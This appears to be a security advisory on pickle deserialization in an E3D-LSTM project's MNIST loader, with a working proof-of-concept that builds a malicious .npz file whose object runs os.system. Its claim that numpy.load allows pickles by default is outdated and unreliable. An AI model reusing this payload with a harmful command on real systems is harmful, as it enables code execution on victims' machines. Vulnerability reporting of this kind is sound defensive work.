- **Vulnerability Name:** Deserialization of Untrusted Data in MNIST Dataset Loading
- **Description:**
    - The `mnist.py` file's `InputHandle.load()` function uses `numpy.load()` to load data from `.npz` files. These files are provided as command-line arguments `--train_data_paths` and `--valid_data_paths` to `run.py`.
    - `numpy.load()` by default allows loading pickled Python objects from `.npz` files (i.e., `allow_pickle=True`).
    - A malicious actor can create a specially crafted `.npz` file containing a pickled object. When this file is loaded by `numpy.load()`, the pickled object can execute arbitrary Python code.
    - To trigger this vulnerability, an attacker would need to convince a user to train or test the model using a malicious `.npz` file by providing its path as either `--train_data_paths` or `--valid_data_paths` argument when executing `run.py` or the provided shell scripts.
- **Impact:** Arbitrary code execution on the machine running the training or testing script. This can lead to:
    - Complete compromise of the system.
    - Data exfiltration and theft.
    - Installation of malware or backdoors.
    - Denial of service (although this specific vulnerability is primarily for code execution, it could be leveraged for DoS).
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:**
    - None. The code directly uses `np.load()` without any input validation or security considerations for the loaded data.
- **Missing Mitigations:**
    - **Disable `allow_pickle` in `np.load()`:** The most effective mitigation is to load `.npz` files with `allow_pickle=False` in `numpy.load()`. This prevents the execution of arbitrary code from pickled objects within the `.npz` file. This would restrict `.npz` loading to only NumPy arrays and related data structures, which are safe from arbitrary code execution vulnerabilities.
    - **Input validation and sanitization:** While difficult for complex data formats like `.npz`, basic validation could check for unexpected file structures or unusually large data chunks. However, this is not a robust solution against malicious pickles.
    - **Sandboxing or containerization:** Running the training and testing processes within a sandboxed environment (like Docker or VMs) can limit the potential damage if code execution occurs. This doesn't prevent the vulnerability but contains its impact.
- **Preconditions:**
    - The user must execute `run.py` or one of the provided shell scripts (`e3d_lstm_mm_train.sh`, `e3d_lstm_kth_train.sh`).
    - The user must provide or be tricked into providing a path to a malicious `.npz` file as either the `--train_data_paths` or `--valid_data_paths` command-line argument.
    - The attacker needs a way to deliver or make the malicious `.npz` file accessible to the user, for example, through social engineering, compromised websites, or man-in-the-middle attacks.
- **Source Code Analysis:**
    - **File: `/code/src/data_provider/mnist.py`**
        ```python
        def load(self):
            """Load the data."""
            dat_1 = np.load(self.paths[0]) # Vulnerable line: np.load() with default allow_pickle=True
            for key in dat_1.keys():
                self.data[key] = dat_1[key]
            if self.num_paths == 2:
                dat_2 = np.load(self.paths[1]) # Vulnerable line: np.load() with default allow_pickle=True
                num_clips_1 = dat_1['clips'].shape[1]
                dat_2['clips'][:, :, 0] += num_clips_1
                self.data['clips'] = np.concatenate((dat_1['clips'], dat_2['clips']),
                                                    axis=1)
                self.data['input_raw_data'] = np.concatenate(
                    (dat_1['input_raw_data'], dat_2['input_raw_data']), axis=0)
                self.data['output_raw_data'] = np.concatenate(
                    (dat_1['output_raw_data'], dat_2['output_raw_data']), axis=0)
        ```
        - The lines `dat_1 = np.load(self.paths[0])` and `dat_2 = np.load(self.paths[1])` in the `load` function of the `InputHandle` class in `/code/src/data_provider/mnist.py` are vulnerable.
        - They use `numpy.load()` to load `.npz` files without specifying `allow_pickle=False`. This means that if the `.npz` file contains a pickled object, `numpy.load()` will deserialize it, potentially executing arbitrary code embedded within the pickle.
- **Security Test Case:**
    - **Step 1: Create a malicious `.npz` file:**
        ```python
        import numpy as np
        import pickle
        import os

        command_to_execute = "touch /tmp/pwned_e3dlstm"  # Command to execute on the system

        class MaliciousObject:
            def __reduce__(self):
                return (os.system, (command_to_execute,))

        malicious_data = {'clips': np.array([[[0, 10]], [[10, 10]]]),
                          'input_raw_data': np.zeros((20, 64, 64, 1)),
                          'output_raw_data': np.zeros((20, 64, 64, 1)),
                          'dims': np.array([(64, 64, 1), (64, 64, 1)]) ,
                          'malicious_code': MaliciousObject()}

        np.savez('malicious.npz', **malicious_data)
        ```
    - **Step 2: Run the training script with the malicious `.npz` file:**
        ```bash
        python run.py \
            --is_training True \
            --dataset_name mnist \
            --train_data_paths malicious.npz \
            --valid_data_paths malicious.npz \
            --save_dir checkpoints/_mnist_e3d_lstm \
            --gen_frm_dir results/_mnist_e3d_lstm \
            --model_name e3d_lstm \
            --allow_gpu_growth True \
            --img_channel 1 \
            --img_width 64 \
            --input_length 10 \
            --total_length 20 \
            --filter_size 5 \
            --num_hidden 64,64,64,64 \
            --patch_size 4 \
            --layer_norm True \
            --sampling_stop_iter 50000 \
            --sampling_start_value 1.0 \
            --sampling_delta_per_iter 0.00002 \
            --lr 0.001 \
            --batch_size 4 \
            --max_iterations 1 \
            --display_interval 1 \
            --test_interval 1 \
            --snapshot_interval 10000
        ```
    - **Step 3: Verify code execution:**
        - After running the script, check if the file `/tmp/pwned_e3dlstm` exists.
        ```bash
        ls /tmp/pwned_e3dlstm
        ```
        - If the file `/tmp/pwned_e3dlstm` exists, it confirms that the code within the malicious `.npz` file was executed, demonstrating the arbitrary code execution vulnerability.